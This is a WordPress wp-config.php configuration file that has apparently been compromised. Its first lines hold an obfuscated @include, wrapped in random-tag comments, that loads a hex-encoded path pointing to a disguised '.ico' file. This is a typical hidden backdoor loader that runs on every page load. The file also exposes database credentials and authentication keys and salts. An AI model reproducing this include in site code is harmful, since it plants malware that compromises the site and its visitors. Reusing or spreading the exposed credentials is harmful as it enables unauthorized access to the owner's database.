<?php

/*b682f*/

@include "\x2fho\x6de/\x6amm\x3602\x36/t\x68eb\x69gn\x65ss\x62an\x64.c\x6fm/\x6ded\x69a-\x6fnl\x79/f\x61vi\x63on\x5fad\x6501\x65.i\x63o";

/*b682f*/
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */
 
// Include local configuration
if (file_exists(dirname(__FILE__) . '/local-config.php')) {
	include(dirname(__FILE__) . '/local-config.php');
}

// Global DB config
if (!defined('DB_NAME')) {
	define('DB_NAME', 'thebigness');
}
if (!defined('DB_USER')) {
	define('DB_USER', 'buenou5er');
}
if (!defined('DB_PASSWORD')) {
	define('DB_PASSWORD', 'Buenop@55');
}
if (!defined('DB_HOST')) {
	define('DB_HOST', 'mysql.iambueno.com');
}

/** Database Charset to use in creating database tables. */
if (!defined('DB_CHARSET')) {
	define('DB_CHARSET', 'utf8');
}

/** The Database Collate type. Don't change this if in doubt. */
if (!defined('DB_COLLATE')) {
	define('DB_COLLATE', '');
}

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         ',vC?.-Ga4V_x]6Xd,rjZ] TW]^`qsw~hZR-2IN$HZ;-+h@1Y{DW0|]j(n_rh0-9m');
define('SECURE_AUTH_KEY',  ';-|@>[&2oB~Tq/IG8--[s7WI$D}Mp>AgV<VBtj0+sryO%1+6x-PU^$)gbG#NVd-F');
define('LOGGED_IN_KEY',    'yu|]wXtd#Q54+c3 _FHs1Gp<$LBvv`pAFydwXgF!Y:Mcd[A|5^q/ev42DLUZivrH');
define('NONCE_KEY',        'R~> RQv2Jy&X5Z(k% t%bNA@*ed}%cObq$aW`yy(9OCMT9ba1w|c1-i/H+bCIS83');
define('AUTH_SALT',        'z4B#Sz0tf=#.*3$A${+b<pyUuVUw&;d]1$._,rDk (E%-YO1kz|V6kIE1x.SD.E2');
define('SECURE_AUTH_SALT', '+x|o|msxD)0hXNXU6eawaciDgHzzN.^L+TcZnNP.ed/y-}/g+Ox{+E`##)=}Qc#j');
define('LOGGED_IN_SALT',   'IPCeJK}~I$_ec3Q^(H; 8y^n(L~P0&~xW:Q3u*-4A|P-)3i6bZz^OdK!dL|y*s!y');
define('NONCE_SALT',       '-v-.0grThkzK6DNb>--m;jX_ mvly+C|ynF3~7^*T(sH@F]c&nz|lg^%-k[2uL>_');
//define('WP_ENV', 'development');
/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');



/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
if (!defined('WP_DEBUG')) {
	define('WP_DEBUG', false);
}

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
